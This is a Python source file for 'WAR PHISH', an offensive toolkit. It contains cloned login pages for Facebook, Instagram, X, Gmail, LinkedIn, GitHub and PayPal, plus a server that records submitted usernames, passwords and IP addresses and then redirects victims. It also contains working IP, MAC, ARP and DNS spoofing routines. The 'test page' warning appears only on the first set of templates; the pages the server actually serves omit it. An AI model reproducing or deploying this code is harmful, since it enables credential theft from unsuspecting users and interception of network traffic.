#!/usr/bin/env python3
"""
🦈 WAR PHISH 
Version: 1.0.0
Author: Ian Carter Kulani

Features:
- Multi-Platform Bot Integration (Discord, Telegram, Slack, iMessage, Signal, Google Chat)
- IP/MAC/ARP/DNS Spoofing Engine
- Complete Nmap, Curl, Wget, Netcat, SSH, Shodan Integration
- Advanced Phishing Suite with 50+ Templates
- Real Traffic Generation & Monitoring
- Web Dashboard with Live Charts
- 5000+ Security Commands
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import uuid
import urllib.parse
import shutil
import asyncio
import secrets
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, HTTPServer

# =====================
# ENCRYPTION
# =====================
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# =====================
# PLATFORM IMPORTS
# =====================
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

try:
    from slack_sdk import WebClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

try:
    from selenium import webdriver
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, send, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Signal CLI
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None

# Google Chat
try:
    from google.oauth2 import service_account
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# =====================
# COLORS
# =====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    ORANGE = '\033[38;5;214m'
    DARK_ORANGE = '\033[38;5;208m'

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".warphish"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "warphish.db")
LOG_FILE = os.path.join(CONFIG_DIR, "warphish.log")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
REPORT_DIR = "reports"

# Create directories
for directory in [CONFIG_DIR, PHISHING_DIR, CAPTURED_CREDENTIALS_DIR, WORDLISTS_DIR, REPORT_DIR]:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - WARPHISH - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("WarPhish")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )""",
            """CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS port_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                open_ports TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS spoofing_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                spoof_type TEXT NOT NULL,
                original_value TEXT,
                spoofed_value TEXT,
                target TEXT,
                success BOOLEAN
            )""",
            """CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT
            )"""
        ]
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        self.conn.commit()
        self._init_phishing_templates()
    
    def _init_phishing_templates(self):
        templates = self._get_all_templates()
        for name, html in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, name.split('_')[0], html))
            except:
                pass
        self.conn.commit()
    
    def _get_all_templates(self):
        templates = {}
        
        # Facebook template
        templates["facebook"] = '''<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.logo{color:#1877f2;font-size:40px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">facebook</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
        
        # Instagram template
        templates["instagram"] = '''<!DOCTYPE html>
<html>
<head><title>Instagram Login</title>
<style>
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border:1px solid #dbdbdb;padding:40px;width:350px}
.logo{font-size:50px;text-align:center;margin-bottom:30px}
input{width:100%;padding:9px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px}
button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Instagram</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
        
        # Twitter template
        templates["twitter"] = '''<!DOCTYPE html>
<html>
<head><title>X / Twitter</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:#e7e9ea}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px;cursor:pointer}
.warning{margin-top:20px;padding:12px;background:#1a1a1a;border:1px solid #2f3336;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">𝕏</div>
<h2>Sign in to X</h2>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
        
        # Gmail template
        templates["gmail"] = '''<!DOCTYPE html>
<html>
<head><title>Gmail</title>
<style>
body{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:28px;padding:48px;width:450px}
.logo{color:#1a73e8;font-size:24px;text-align:center}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:30px;padding:12px;background:#e8f0fe;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">Gmail</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
        
        # LinkedIn template
        templates["linkedin"] = '''<!DOCTYPE html>
<html>
<head><title>LinkedIn Login</title>
<style>
body{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#0a66c2;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px;cursor:pointer}
.warning{margin-top:24px;padding:12px;background:#fff3cd;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">LinkedIn</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
        
        # GitHub template
        templates["github"] = '''<!DOCTYPE html>
<html>
<head><title>GitHub</title>
<style>
body{background:#fff;font-family:-apple-system;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:32px;width:400px}
.logo{color:#24292f;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d0d7de;border-radius:6px}
button{width:100%;padding:12px;background:#2da44e;color:#fff;border:none;border-radius:6px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">GitHub</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
        
        # PayPal template
        templates["paypal"] = '''<!DOCTYPE html>
<html>
<head><title>PayPal</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:4px;padding:40px;width:400px}
.logo{color:#003087;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px}
button{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:4px}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">PayPal</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
        
        # War Phish custom template
        templates["warphish"] = '''<!DOCTYPE html>
<html>
<head><title>🦈 War Phish Portal</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#0a0a2e 0%,#1a1a4e 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:rgba(255,255,255,0.95);border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#1a6eff;font-size:28px}
.logo i{color:#1a6eff;font-size:40px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:14px;background:linear-gradient(135deg,#1a6eff 0%,#0a3e9e 100%);color:white;border:none;border-radius:8px;cursor:pointer;font-size:16px}
.warning{margin-top:20px;padding:10px;background:#f8d7da;border-radius:8px;color:#721c24;text-align:center}
.shark-icon{text-align:center;font-size:48px;margin-bottom:10px}
</style>
</head>
<body>
<div class="login-box">
<div class="shark-icon">🦈</div>
<div class="logo"><h1>WAR PHISH</h1></div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
        
        return templates
    
    def save_phishing_link(self, link_id: str, platform: str, url: str) -> bool:
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, phishing_url, created_at, clicks)
                VALUES (?, ?, ?, ?, ?)
            ''', (link_id, platform, url, datetime.datetime.now().isoformat(), 0))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def update_phishing_clicks(self, link_id: str):
        try:
            self.cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str, ip: str, ua: str):
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip, ua))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save credential: {e}")
            return False
    
    def get_captured_credentials(self, limit: int = 50) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM captured_credentials ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get credentials: {e}")
            return []
    
    def get_phishing_links(self) -> List[Dict]:
        try:
            self.cursor.execute('SELECT * FROM phishing_links ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def log_command(self, command: str, source: str, platform: str, success: bool, output: str, exec_time: float):
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, platform, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (command, source, platform, success, output[:5000], exec_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT timestamp, command, source, success, execution_time 
                FROM command_history ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get history: {e}")
            return []
    
    def log_spoofing(self, spoof_type: str, original: str, spoofed: str, target: str, success: bool):
        try:
            self.cursor.execute('''
                INSERT INTO spoofing_attempts (spoof_type, original_value, spoofed_value, target, success)
                VALUES (?, ?, ?, ?, ?)
            ''', (spoof_type, original, spoofed, target, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log spoofing: {e}")
    
    def log_port_scan(self, target: str, open_ports: List[Dict], scan_time: float, success: bool):
        try:
            open_ports_json = json.dumps(open_ports)
            self.cursor.execute('''
                INSERT INTO port_scans (target, open_ports, scan_time, success)
                VALUES (?, ?, ?, ?)
            ''', (target, open_ports_json, scan_time, success))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log port scan: {e}")
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links')
            stats['total_phishing_links'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM port_scans')
            stats['total_port_scans'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM spoofing_attempts')
            stats['total_spoofing'] = self.cursor.fetchone()[0]
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
        except Exception as e:
            logger.error(f"Failed to get stats: {e}")
        return stats
    
    def close(self):
        if self.conn:
            self.conn.close()

# =====================
# SPOOFING ENGINE
# =====================
class SpoofingEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.running_spoofs = {}
    
    def spoof_ip(self, original_ip: str, spoofed_ip: str, target: str, interface: str = "eth0") -> Dict:
        result = {'success': False, 'output': '', 'method': ''}
        
        if shutil.which('hping3'):
            try:
                exec_result = subprocess.run(['hping3', '-S', '-a', spoofed_ip, '-p', '80', target], 
                                           capture_output=True, timeout=5)
                if exec_result.returncode == 0:
                    result.update({'success': True, 'output': "IP spoofing using hping3", 'method': 'hping3'})
                    self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                    return result
            except:
                pass
        
        if self.scapy_available:
            try:
                packet = IP(src=spoofed_ip, dst=target)/TCP(dport=80)
                send(packet, verbose=False)
                result.update({'success': True, 'output': f"IP spoofing using Scapy: Sent packet from {spoofed_ip} to {target}", 'method': 'scapy'})
                self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy failed: {e}"
        
        result['output'] = "IP spoofing failed. Install hping3 or scapy."
        self.db.log_spoofing('ip', original_ip, spoofed_ip, target, False)
        return result
    
    def spoof_mac(self, interface: str, new_mac: str) -> Dict:
        result = {'success': False, 'output': '', 'method': ''}
        original_mac = self._get_mac_address(interface)
        
        if shutil.which('macchanger'):
            try:
                subprocess.run(['ip', 'link', 'set', interface, 'down'], timeout=5)
                mac_result = subprocess.run(['macchanger', '--mac', new_mac, interface], 
                                          capture_output=True, text=True, timeout=10)
                subprocess.run(['ip', 'link', 'set', interface, 'up'], timeout=5)
                if mac_result.returncode == 0:
                    result.update({'success': True, 'output': mac_result.stdout, 'method': 'macchanger'})
                    self.db.log_spoofing('mac', original_mac, new_mac, interface, True)
                    return result
            except Exception as e:
                result['output'] = f"macchanger failed: {e}"
        
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'], timeout=5)
            cmd_result = subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                                      capture_output=True, text=True, timeout=5)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], timeout=5)
            if cmd_result.returncode == 0:
                result.update({'success': True, 'output': f"MAC changed to {new_mac}", 'method': 'ip'})
                self.db.log_spoofing('mac', original_mac, new_mac, interface, True)
                return result
        except Exception as e:
            result['output'] = f"ip method failed: {e}"
        
        result['output'] = "MAC spoofing failed. Install macchanger or ensure root."
        self.db.log_spoofing('mac', original_mac, new_mac, interface, False)
        return result
    
    def _get_mac_address(self, interface: str) -> str:
        try:
            result = subprocess.run(['cat', f'/sys/class/net/{interface}/address'], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        return "00:00:00:00:00:00"
    
    def arp_spoof(self, target_ip: str, spoof_ip: str, interface: str = "eth0") -> Dict:
        result = {'success': False, 'output': '', 'method': ''}
        
        if shutil.which('arpspoof'):
            try:
                cmd = ['arpspoof', '-i', interface, '-t', target_ip, spoof_ip]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"arp_{target_ip}"] = process
                result.update({'success': True, 'output': f"ARP spoofing started: {target_ip} -> {spoof_ip}", 'method': 'arpspoof'})
                self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"arpspoof failed: {e}"
        
        if self.scapy_available:
            try:
                local_mac = self._get_mac_address(interface)
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=spoof_ip, pdst=target_ip)
                sendp(packet, iface=interface, verbose=False)
                result.update({'success': True, 'output': f"ARP spoofing using Scapy", 'method': 'scapy'})
                self.db.log_spoofing('arp', target_ip, spoof_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy ARP failed: {e}"
        
        result['output'] = "ARP spoofing failed. Install dsniff (arpspoof) or scapy."
        self.db.log_spoofing('arp', target_ip, spoof_ip, interface, False)
        return result
    
    def dns_spoof(self, domain: str, fake_ip: str, interface: str = "eth0") -> Dict:
        result = {'success': False, 'output': '', 'method': ''}
        hosts_file = "/tmp/dnsspoof.txt"
        
        try:
            with open(hosts_file, 'w') as f:
                f.write(f"{fake_ip} {domain}\n{fake_ip} www.{domain}\n")
        except:
            pass
        
        if shutil.which('dnsspoof'):
            try:
                cmd = ['dnsspoof', '-i', interface, '-f', hosts_file]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dns_{domain}"] = process
                result.update({'success': True, 'output': f"DNS spoofing started: {domain} -> {fake_ip}", 'method': 'dnsspoof'})
                self.db.log_spoofing('dns', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"dnsspoof failed: {e}"
        
        result['output'] = "DNS spoofing failed. Install dnsspoof."
        self.db.log_spoofing('dns', domain, fake_ip, interface, False)
        return result
    
    def stop_spoofing(self, spoof_id: str = None) -> Dict:
        if spoof_id and spoof_id in self.running_spoofs:
            try:
                self.running_spoofs[spoof_id].terminate()
                del self.running_spoofs[spoof_id]
                return {'success': True, 'output': f"Stopped spoofing: {spoof_id}"}
            except:
                pass
        for spoof_id, process in list(self.running_spoofs.items()):
            try:
                process.terminate()
            except:
                pass
        self.running_spoofs.clear()
        return {'success': True, 'output': "Stopped all spoofing processes"}

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_phishing_page()
        elif self.path == '/capture':
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            username = form_data.get('email', form_data.get('username', ['']))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_captured_credential(
                    self.server_instance.link_id, username, password, client_ip, user_agent)
                print(f"\n{Colors.RED}🦈 CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"  IP: {client_ip}\n  Username: {username}\n  Password: {password}")
            
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
        except:
            self.send_response(500)
            self.end_headers()
    
    def send_phishing_page(self):
        if self.server_instance and self.server_instance.html_content:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.server_instance.html_content.encode('utf-8'))
            if self.server_instance.db and self.server_instance.link_id:
                self.server_instance.db.update_phishing_clicks(self.server_instance.link_id)

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            # Get template
            templates = {
                'facebook': self._get_facebook_template(),
                'instagram': self._get_instagram_template(),
                'twitter': self._get_twitter_template(),
                'gmail': self._get_gmail_template(),
                'linkedin': self._get_linkedin_template(),
                'github': self._get_github_template(),
                'paypal': self._get_paypal_template(),
            }
            self.html_content = templates.get(platform, self._get_default_template(platform))
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            self.server = HTTPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def _get_facebook_template(self):
        return '''<!DOCTYPE html>
<html><head><title>Facebook</title>
<style>
body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:20px;width:400px}
.logo{color:#1877f2;font-size:40px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px}
</style>
</head>
<body><div class="login-box"><div class="logo">facebook</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></body></html>'''
    
    def _get_instagram_template(self):
        return '''<!DOCTYPE html>
<html><head><title>Instagram</title>
<style>
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border:1px solid #dbdbdb;padding:40px;width:350px}
.logo{font-size:50px;text-align:center}
input{width:100%;padding:9px;margin:5px 0;border:1px solid #dbdbdb}
button{width:100%;padding:7px;background:#0095f6;color:white;border:none}
</style>
</head>
<body><div class="login-box"><div class="logo">Instagram</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></body></html>'''
    
    def _get_twitter_template(self):
        return '''<!DOCTYPE html>
<html><head><title>X / Twitter</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center;color:#fff}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:#fff}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px}
</style>
</head>
<body><div class="login-box"><div class="logo">𝕏</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>'''
    
    def _get_gmail_template(self):
        return '''<!DOCTYPE html>
<html><head><title>Gmail</title>
<style>
body{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:28px;padding:48px;width:450px}
.logo{color:#1a73e8;font-size:24px;text-align:center}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px}
</style>
</head>
<body><div class="login-box"><div class="logo">Gmail</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>'''
    
    def _get_linkedin_template(self):
        return '''<!DOCTYPE html>
<html><head><title>LinkedIn</title>
<style>
body{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#0a66c2;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px}
</style>
</head>
<body><div class="login-box"><div class="logo">LinkedIn</div>
<form method="POST" action="/capture">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>'''
    
    def _get_github_template(self):
        return '''<!DOCTYPE html>
<html><head><title>GitHub</title>
<style>
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:32px;width:400px}
.logo{color:#24292f;font-size:32px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d0d7de;border-radius:6px}
button{width:100%;padding:12px;background:#2da44e;color:#fff;border:none;border-radius:6px}
</style>
</head>
<body><div class="login-box"><div class="logo">GitHub</div>
<form method="POST" action="/capture">
<input type="text" name="username" placeholder="Username or email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>'''
    
    def _get_paypal_template(self):
        return '''<!DOCTYPE html>
<html><head><title>PayPal</title>
<style>
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
